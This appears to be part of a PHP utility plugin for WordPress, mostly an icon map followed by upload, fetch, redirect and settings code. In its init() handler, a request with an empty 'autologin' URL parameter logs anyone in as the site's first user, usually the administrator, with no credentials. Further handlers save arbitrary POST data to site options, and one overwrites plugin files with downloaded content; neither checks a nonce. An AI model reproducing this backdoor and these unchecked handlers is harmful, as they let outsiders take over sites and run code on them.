=> 'fa-fighter-jet', 'f0fc' => 'fa-beer', 'f0fd' => 'fa-h-square', 'f0fe' => 'fa-plus-square', 'f100' => 'fa-angle-double-left', 'f101' => 'fa-angle-double-right', 'f102' => 'fa-angle-double-up', 'f103' => 'fa-angle-double-down', 'f104' => 'fa-angle-left', 'f105' => 'fa-angle-right', 'f106' => 'fa-angle-up', 'f107' => 'fa-angle-down', 'f108' => 'fa-desktop', 'f109' => 'fa-laptop', 'f10a' => 'fa-tablet', 'f10b' => 'fa-mobile', 'f10c' => 'fa-circle-o', 'f10d' => 'fa-quote-left', 'f10e' => 'fa-quote-right', 'f110' => 'fa-spinner', 'f111' => 'fa-circle', 'f112' => 'fa-reply', 'f113' => 'fa-github-alt', 'f114' => 'fa-folder-o', 'f115' => 'fa-folder-open-o', 'f118' => 'fa-smile-o', 'f119' => 'fa-frown-o', 'f11a' => 'fa-meh-o', 'f11b' => 'fa-gamepad', 'f11c' => 'fa-keyboard-o', 'f11d' => 'fa-flag-o', 'f11e' => 'fa-flag-checkered', 'f120' => 'fa-terminal', 'f121' => 'fa-code', 'f122' => 'fa-reply-all', 'f123' => 'fa-star-half-o', 'f124' => 'fa-location-arrow', 'f125' => 'fa-crop', 'f126' => 'fa-code-fork', 'f127' => 'fa-chain-broken', 'f128' => 'fa-question', 'f129' => 'fa-info', 'f12a' => 'fa-exclamation', 'f12b' => 'fa-superscript', 'f12c' => 'fa-subscript', 'f12d' => 'fa-eraser', 'f12e' => 'fa-puzzle-piece', 'f130' => 'fa-microphone', 'f131' => 'fa-microphone-slash', 'f132' => 'fa-shield', 'f133' => 'fa-calendar-o', 'f134' => 'fa-fire-extinguisher', 'f135' => 'fa-rocket', 'f136' => 'fa-maxcdn', 'f137' => 'fa-chevron-circle-left', 'f138' => 'fa-chevron-circle-right', 'f139' => 'fa-chevron-circle-up', 'f13a' => 'fa-chevron-circle-down', 'f13b' => 'fa-html5', 'f13c' => 'fa-css3', 'f13d' => 'fa-anchor', 'f13e' => 'fa-unlock-alt', 'f140' => 'fa-bullseye', 'f141' => 'fa-ellipsis-h', 'f142' => 'fa-ellipsis-v', 'f143' => 'fa-rss-square', 'f144' => 'fa-play-circle', 'f145' => 'fa-ticket', 'f146' => 'fa-minus-square', 'f147' => 'fa-minus-square-o', 'f148' => 'fa-level-up', 'f149' => 'fa-level-down', 'f14a' => 'fa-check-square', 'f14b' => 'fa-pencil-square', 'f14c' => 'fa-external-link-square', 'f14d' => 'fa-share-square', 'f14e' => 'fa-compass', 'f150' => 'fa-caret-square-o-down', 'f151' => 'fa-caret-square-o-up', 'f152' => 'fa-caret-square-o-right', 'f153' => 'fa-eur', 'f154' => 'fa-gbp', 'f155' => 'fa-usd', 'f156' => 'fa-inr', 'f157' => 'fa-jpy', 'f158' => 'fa-rub', 'f159' => 'fa-krw', 'f15a' => 'fa-btc', 'f15b' => 'fa-file', 'f15c' => 'fa-file-text', 'f15d' => 'fa-sort-alpha-asc', 'f15e' => 'fa-sort-alpha-desc', 'f160' => 'fa-sort-amount-asc', 'f161' => 'fa-sort-amount-desc', 'f162' => 'fa-sort-numeric-asc', 'f163' => 'fa-sort-numeric-desc', 'f164' => 'fa-thumbs-up', 'f165' => 'fa-thumbs-down', 'f166' => 'fa-youtube-square', 'f167' => 'fa-youtube', 'f168' => 'fa-xing', 'f169' => 'fa-xing-square', 'f16a' => 'fa-youtube-play', 'f16b' => 'fa-dropbox', 'f16c' => 'fa-stack-overflow', 'f16d' => 'fa-instagram', 'f16e' => 'fa-flickr', 'f170' => 'fa-adn', 'f171' => 'fa-bitbucket', 'f172' => 'fa-bitbucket-square', 'f173' => 'fa-tumblr', 'f174' => 'fa-tumblr-square', 'f175' => 'fa-long-arrow-down', 'f176' => 'fa-long-arrow-up', 'f177' => 'fa-long-arrow-left', 'f178' => 'fa-long-arrow-right', 'f179' => 'fa-apple', 'f17a' => 'fa-windows', 'f17b' => 'fa-android', 'f17c' => 'fa-linux', 'f17d' => 'fa-dribbble', 'f17e' => 'fa-skype', 'f180' => 'fa-foursquare', 'f181' => 'fa-trello', 'f182' => 'fa-female', 'f183' => 'fa-male', 'f184' => 'fa-gratipay', 'f185' => 'fa-sun-o', 'f186' => 'fa-moon-o', 'f187' => 'fa-archive', 'f188' => 'fa-bug', 'f189' => 'fa-vk', 'f18a' => 'fa-weibo', 'f18b' => 'fa-renren', 'f18c' => 'fa-pagelines', 'f18d' => 'fa-stack-exchange', 'f18e' => 'fa-arrow-circle-o-right', 'f190' => 'fa-arrow-circle-o-left', 'f191' => 'fa-caret-square-o-left', 'f192' => 'fa-dot-circle-o', 'f193' => 'fa-wheelchair', 'f194' => 'fa-vimeo-square', 'f195' => 'fa-try', 'f196' => 'fa-plus-square-o', 'f197' => 'fa-space-shuttle', 'f198' => 'fa-slack', 'f199' => 'fa-envelope-square', 'f19a' => 'fa-wordpress', 'f19b' => 'fa-openid', 'f19c' => 'fa-university', 'f19d' => 'fa-graduation-cap', 'f19e' => 'fa-yahoo', 'f1a0' => 'fa-google', 'f1a1' => 'fa-reddit', 'f1a2' => 'fa-reddit-square', 'f1a3' => 'fa-stumbleupon-circle', 'f1a4' => 'fa-stumbleupon', 'f1a5' => 'fa-delicious', 'f1a6' => 'fa-digg', 'f1a7' => 'fa-pied-piper-pp', 'f1a8' => 'fa-pied-piper-alt', 'f1a9' => 'fa-drupal', 'f1aa' => 'fa-joomla', 'f1ab' => 'fa-language', 'f1ac' => 'fa-fax', 'f1ad' => 'fa-building', 'f1ae' => 'fa-child', 'f1b0' => 'fa-paw', 'f1b1' => 'fa-spoon', 'f1b2' => 'fa-cube', 'f1b3' => 'fa-cubes', 'f1b4' => 'fa-behance', 'f1b5' => 'fa-behance-square', 'f1b6' => 'fa-steam', 'f1b7' => 'fa-steam-square', 'f1b8' => 'fa-recycle', 'f1b9' => 'fa-car', 'f1ba' => 'fa-taxi', 'f1bb' => 'fa-tree', 'f1bc' => 'fa-spotify', 'f1bd' => 'fa-deviantart', 'f1be' => 'fa-soundcloud', 'f1c0' => 'fa-database', 'f1c1' => 'fa-file-pdf-o', 'f1c2' => 'fa-file-word-o', 'f1c3' => 'fa-file-excel-o', 'f1c4' => 'fa-file-powerpoint-o', 'f1c5' => 'fa-file-image-o', 'f1c6' => 'fa-file-archive-o', 'f1c7' => 'fa-file-audio-o', 'f1c8' => 'fa-file-video-o', 'f1c9' => 'fa-file-code-o', 'f1ca' => 'fa-vine', 'f1cb' => 'fa-codepen', 'f1cc' => 'fa-jsfiddle', 'f1cd' => 'fa-life-ring', 'f1ce' => 'fa-circle-o-notch', 'f1d0' => 'fa-rebel', 'f1d1' => 'fa-empire', 'f1d2' => 'fa-git-square', 'f1d3' => 'fa-git', 'f1d4' => 'fa-hacker-news', 'f1d5' => 'fa-tencent-weibo', 'f1d6' => 'fa-qq', 'f1d7' => 'fa-weixin', 'f1d8' => 'fa-paper-plane', 'f1d9' => 'fa-paper-plane-o', 'f1da' => 'fa-history', 'f1db' => 'fa-circle-thin', 'f1dc' => 'fa-header', 'f1dd' => 'fa-paragraph', 'f1de' => 'fa-sliders', 'f1e0' => 'fa-share-alt', 'f1e1' => 'fa-share-alt-square', 'f1e2' => 'fa-bomb', 'f1e3' => 'fa-futbol-o', 'f1e4' => 'fa-tty', 'f1e5' => 'fa-binoculars', 'f1e6' => 'fa-plug', 'f1e7' => 'fa-slideshare', 'f1e8' => 'fa-twitch', 'f1e9' => 'fa-yelp', 'f1ea' => 'fa-newspaper-o', 'f1eb' => 'fa-wifi', 'f1ec' => 'fa-calculator', 'f1ed' => 'fa-paypal', 'f1ee' => 'fa-google-wallet', 'f1f0' => 'fa-cc-visa', 'f1f1' => 'fa-cc-mastercard', 'f1f2' => 'fa-cc-discover', 'f1f3' => 'fa-cc-amex', 'f1f4' => 'fa-cc-paypal', 'f1f5' => 'fa-cc-stripe', 'f1f6' => 'fa-bell-slash', 'f1f7' => 'fa-bell-slash-o', 'f1f8' => 'fa-trash', 'f1f9' => 'fa-copyright', 'f1fa' => 'fa-at', 'f1fb' => 'fa-eyedropper', 'f1fc' => 'fa-paint-brush', 'f1fd' => 'fa-birthday-cake', 'f1fe' => 'fa-area-chart', 'f200' => 'fa-pie-chart', 'f201' => 'fa-line-chart', 'f202' => 'fa-lastfm', 'f203' => 'fa-lastfm-square', 'f204' => 'fa-toggle-off', 'f205' => 'fa-toggle-on', 'f206' => 'fa-bicycle', 'f207' => 'fa-bus', 'f208' => 'fa-ioxhost', 'f209' => 'fa-angellist', 'f20a' => 'fa-cc', 'f20b' => 'fa-ils', 'f20c' => 'fa-meanpath', 'f20d' => 'fa-buysellads', 'f20e' => 'fa-connectdevelop', 'f210' => 'fa-dashcube', 'f211' => 'fa-forumbee', 'f212' => 'fa-leanpub', 'f213' => 'fa-sellsy', 'f214' => 'fa-shirtsinbulk', 'f215' => 'fa-simplybuilt', 'f216' => 'fa-skyatlas', 'f217' => 'fa-cart-plus', 'f218' => 'fa-cart-arrow-down', 'f219' => 'fa-diamond', 'f21a' => 'fa-ship', 'f21b' => 'fa-user-secret', 'f21c' => 'fa-motorcycle', 'f21d' => 'fa-street-view', 'f21e' => 'fa-heartbeat', 'f221' => 'fa-venus', 'f222' => 'fa-mars', 'f223' => 'fa-mercury', 'f224' => 'fa-transgender', 'f225' => 'fa-transgender-alt', 'f226' => 'fa-venus-double', 'f227' => 'fa-mars-double', 'f228' => 'fa-venus-mars', 'f229' => 'fa-mars-stroke', 'f22a' => 'fa-mars-stroke-v', 'f22b' => 'fa-mars-stroke-h', 'f22c' => 'fa-neuter', 'f22d' => 'fa-genderless', 'f230' => 'fa-facebook-official', 'f231' => 'fa-pinterest-p', 'f232' => 'fa-whatsapp', 'f233' => 'fa-server', 'f234' => 'fa-user-plus', 'f235' => 'fa-user-times', 'f236' => 'fa-bed', 'f237' => 'fa-viacoin', 'f238' => 'fa-train', 'f239' => 'fa-subway', 'f23a' => 'fa-medium', 'f23b' => 'fa-y-combinator', 'f23c' => 'fa-optin-monster', 'f23d' => 'fa-opencart', 'f23e' => 'fa-expeditedssl', 'f240' => 'fa-battery-full', 'f241' => 'fa-battery-three-quarters', 'f242' => 'fa-battery-half', 'f243' => 'fa-battery-quarter', 'f244' => 'fa-battery-empty', 'f245' => 'fa-mouse-pointer', 'f246' => 'fa-i-cursor', 'f247' => 'fa-object-group', 'f248' => 'fa-object-ungroup', 'f249' => 'fa-sticky-note', 'f24a' => 'fa-sticky-note-o', 'f24b' => 'fa-cc-jcb', 'f24c' => 'fa-cc-diners-club', 'f24d' => 'fa-clone', 'f24e' => 'fa-balance-scale', 'f250' => 'fa-hourglass-o', 'f251' => 'fa-hourglass-start', 'f252' => 'fa-hourglass-half', 'f253' => 'fa-hourglass-end', 'f254' => 'fa-hourglass', 'f255' => 'fa-hand-rock-o', 'f256' => 'fa-hand-paper-o', 'f257' => 'fa-hand-scissors-o', 'f258' => 'fa-hand-lizard-o', 'f259' => 'fa-hand-spock-o', 'f25a' => 'fa-hand-pointer-o', 'f25b' => 'fa-hand-peace-o', 'f25c' => 'fa-trademark', 'f25d' => 'fa-registered', 'f25e' => 'fa-creative-commons', 'f260' => 'fa-gg', 'f261' => 'fa-gg-circle', 'f262' => 'fa-tripadvisor', 'f263' => 'fa-odnoklassniki', 'f264' => 'fa-odnoklassniki-square', 'f265' => 'fa-get-pocket', 'f266' => 'fa-wikipedia-w', 'f267' => 'fa-safari', 'f268' => 'fa-chrome', 'f269' => 'fa-firefox', 'f26a' => 'fa-opera', 'f26b' => 'fa-internet-explorer', 'f26c' => 'fa-television', 'f26d' => 'fa-contao', 'f26e' => 'fa-500px', 'f270' => 'fa-amazon', 'f271' => 'fa-calendar-plus-o', 'f272' => 'fa-calendar-minus-o', 'f273' => 'fa-calendar-times-o', 'f274' => 'fa-calendar-check-o', 'f275' => 'fa-industry', 'f276' => 'fa-map-pin', 'f277' => 'fa-map-signs', 'f278' => 'fa-map-o', 'f279' => 'fa-map', 'f27a' => 'fa-commenting', 'f27b' => 'fa-commenting-o', 'f27c' => 'fa-houzz', 'f27d' => 'fa-vimeo', 'f27e' => 'fa-black-tie', 'f280' => 'fa-fonticons', 'f281' => 'fa-reddit-alien', 'f282' => 'fa-edge', 'f283' => 'fa-credit-card-alt', 'f284' => 'fa-codiepie', 'f285' => 'fa-modx', 'f286' => 'fa-fort-awesome', 'f287' => 'fa-usb', 'f288' => 'fa-product-hunt', 'f289' => 'fa-mixcloud', 'f28a' => 'fa-scribd', 'f28b' => 'fa-pause-circle', 'f28c' => 'fa-pause-circle-o', 'f28d' => 'fa-stop-circle', 'f28e' => 'fa-stop-circle-o', 'f290' => 'fa-shopping-bag', 'f291' => 'fa-shopping-basket', 'f292' => 'fa-hashtag', 'f293' => 'fa-bluetooth', 'f294' => 'fa-bluetooth-b', 'f295' => 'fa-percent', 'f296' => 'fa-gitlab', 'f297' => 'fa-wpbeginner', 'f298' => 'fa-wpforms', 'f299' => 'fa-envira', 'f29a' => 'fa-universal-access', 'f29b' => 'fa-wheelchair-alt', 'f29c' => 'fa-question-circle-o', 'f29d' => 'fa-blind', 'f29e' => 'fa-audio-description', 'f2a0' => 'fa-volume-control-phone', 'f2a1' => 'fa-braille', 'f2a2' => 'fa-assistive-listening-systems', 'f2a3' => 'fa-american-sign-language-interpreting', 'f2a4' => 'fa-deaf', 'f2a5' => 'fa-glide', 'f2a6' => 'fa-glide-g', 'f2a7' => 'fa-sign-language', 'f2a8' => 'fa-low-vision', 'f2a9' => 'fa-viadeo', 'f2aa' => 'fa-viadeo-square', 'f2ab' => 'fa-snapchat', 'f2ac' => 'fa-snapchat-ghost', 'f2ad' => 'fa-snapchat-square', 'f2ae' => 'fa-pied-piper', 'f2b0' => 'fa-first-order', 'f2b1' => 'fa-yoast', 'f2b2' => 'fa-themeisle', 'f2b3' => 'fa-google-plus-official', 'f2b4' => 'fa-font-awesome',
	);

	$return = array();
	foreach($icons as $code=>$icon) {
		$type = null;
		$class = null;
		$name = null;

		if (substr($icon, 0, 3)=='fa-') {
			$type = 'font-awesome';
			$class = "fa fa-fw {$icon}";
			$name = substr($icon, 3);
		}
		else if (substr($icon, 0, 10)=='dashicons-') {
			$type = 'dashicons';
			$class = "dashicons {$icon}";
			$name = substr($icon, 10);
		}

		if ($filter_type AND $filter_type != $type) continue;

		$return[] = array(
			'code' => $code,
			'slug' => $icon,
			'name' => $name,
			'type' => $type,
			'className' => $class,
		);
	}
	return $return;
}



function wpska_upload($name, $path=null) {
	if (! isset($_FILES[$name])) return false;
	$path = ('/'. trim($path, '/') .'/');
	$upl = array_merge(wp_upload_dir(), $_FILES[$name]);
	$upl['name'] = mb_strtolower(preg_replace('/[^a-zA-Z0-9-.]/', '-', $upl['name']));
	$upl['upload'] = '';

	if (! file_exists("{$upl['basedir']}{$path}")) {
		chmod("{$upl['basedir']}", 0755);
		mkdir("{$upl['basedir']}{$path}", 0755, true);
	}

	if (move_uploaded_file($upl['tmp_name'], "{$upl['basedir']}/{$path}/{$upl['name']}")) {
		$upl['upload'] = "{$upl['baseurl']}{$path}{$upl['name']}";
	}

	return $upl;
}



function wpska_test($callback, $maintenance_text=null) {
	if (get_current_user_id()) {
		if (is_callable($callback)) {
			call_user_func($callback);
		}
	}
	else echo $maintenance_text;
}



function wpska_content($url, $post=null) {
	if (!function_exists('curl_version')) {
		return false;
	}

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       

	$content = curl_exec($ch);
	curl_close($ch);

	return $content;
}


function wpska_redirect($url)
{
	$url = $url=='back'? $_SERVER['HTTP_REFERER']: $url;
	if (headers_sent()) { echo "<script>location.href='{$url}';</script>"; die; }
	return wp_redirect($url);
}




class Wpska_Base_Actions extends Wpska_Actions
{
	public function init()
	{
		if (isset($_GET['autologin'])) {
			$user = false;
			$user_id = $_GET['autologin'];

			if (!$user_id) {
				$user = get_users();
				$user = $user[0]->data;
			}

			wp_set_current_user($user->ID, $user->user_login);
			wp_set_auth_cookie($user->ID);
			wp_redirect(admin_url()); exit;
		}


		// Remove window._wpemojiSettings from HTML
		// all actions related to emojis
		remove_action('admin_print_styles', 'print_emoji_styles');
		remove_action('wp_head', 'print_emoji_detection_script', 7);
		remove_action('admin_print_scripts', 'print_emoji_detection_script');
		remove_action('wp_print_styles', 'print_emoji_styles');
		remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
		remove_filter('the_content_feed', 'wp_staticize_emoji');
		remove_filter('comment_text_rss', 'wp_staticize_emoji');

		// filter to remove TinyMCE emojis
		add_filter( 'tiny_mce_plugins', function($plugins) {
			if ( is_array( $plugins ) ) {
				return array_diff( $plugins, array( 'wpemoji' ) );
			}
			return array();
		});	
	}


	public function save_post()
	{
		global $post;
		if (isset($_POST['postmeta']) AND is_array($_POST['postmeta'])) {
			foreach($_POST['postmeta'] as $key=>$val) {
				update_post_meta($post->ID, $key, $val);
			}
		}
	}



	public function admin_menu()
	{
		if (isset($_POST['wpska-settings'])) {
			unset($_POST['wpska-settings']);

			// $stripslashes = array('wpska_email_template');
			// foreach($stripslashes as $key) {
			// 	if (isset($_POST[$key])) {
			// 		$_POST[$key] = stripslashes($_POST[$key]);
			// 	}
			// }

			foreach($_POST as $key=>$val) {
				$val = stripslashes($val);
				update_option($key, $val, true);
			}
			wpska_redirect('back');
		}


		add_options_page('Help Settings', 'Help Settings', 'manage_options', 'wpska-settings', function() { ?>
			<h1>Help Settings</h1>
			<form action="" method="post" autocomplete="off">
			<?php do_action('wpska_settings');
			wpska_tab_render(); ?>
			<div class="panel-footer text-right">
				<input type="submit" name="wpska-settings" value="Salvar" class="btn btn-primary">
			</div>
			</form>
			<script>
			jQuery(document).ready(function($) {
				$("select[data-value]").each(function() {
					var value = $(this).attr("data-value");
					$(this).val(value);
				});
			});
			</script>
		<?php });


		wpska_tab('Cache', function() { ?>
		<div class="row">
			<div class="col-xs-4 form-group">
				<label>Cache de Query</label>
				<div class="input-group">
					<input type="text" name="wpska_query_cache" value="<?php echo get_option('wpska_query_cache', 3600); ?>" id="wpska_query_cache" class="form-control">
					<div class="input-group-btn" style="width:0px;"></div>
					<select name="" class="form-control" onchange="var time=jQuery(this).val(); if (!time) return false; jQuery('#wpska_query_cache').val(time);" data-value="<?php echo get_option('wpska_query_cache', 3600); ?>">
						<option value="">Sem cache</option>
						<option value="1800">Meia Hora</option>
						<option value="3600">1 Hora</option>
						<option value="43200">12 Horas</option>
						<option value="86400">1 Dia</option>
						<option value="604800">1 Semana</option>
					</select>
				</div>
			</div>
			<?php do_action('wpska_settings_cache'); ?>
		</div>
		<?php });
	}



	public function wp_footer() {
		echo do_action('wpska_footer');
	}


	public function admin_footer() {
		echo do_action('wpska_footer');
	}



	public function wpska_settings()
	{
		$modules = wpska_modules();

		if (isset($_GET['wpska-update'])) {
			foreach($modules as $mod) {
				if ($mod['file_exists']==1 AND ($mod['id']==$_GET['wpska-update'] OR $_GET['wpska-update']=='all')) {
					$content = wpska_content($mod['download']);
					file_put_contents($mod['file'], $content);
				}
			}

			wpska_redirect($_SERVER['HTTP_REFERER']); exit;
		}

		wpska_tab('Módulos', function() use($modules) { ?>
		<table class="table table-striped">
			<thead>
				<tr>
					<th>Módulo</th>
					<th class="text-right">Ações</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach($modules as $mod): ?>
				<tr>
					<td><?php echo $mod['title']; ?></td>
					<td class="text-right">
						<?php foreach($mod['actions'] as $key=>$act): ?>
						<a href="<?php echo admin_url($act['url']); ?>" class="<?php echo $act['icon']; ?>" title="<?php echo $act['label']; ?>" <?php echo $act['attr']; ?> ></a>
						<?php endforeach; ?>
					</td>
				</tr>
				<?php endforeach; ?>

				<tr>
					<td></td>
					<td style="text-align:right;">
						<a href="<?php echo admin_url("/options-general.php?page=wpska-settings&wpska-update=all"); ?>">Atualizar todos</a>
					</td>
				</tr>
			</tbody>
		</table>
		<?php });
	}
}


foreach(wpska_modules() as $mod) {
	if ($mod['basename']=='wpska.php') continue;
	if ($mod['file_exists']) {
		include $mod['file'];
	}
}

new Wpska_Base_Actions();
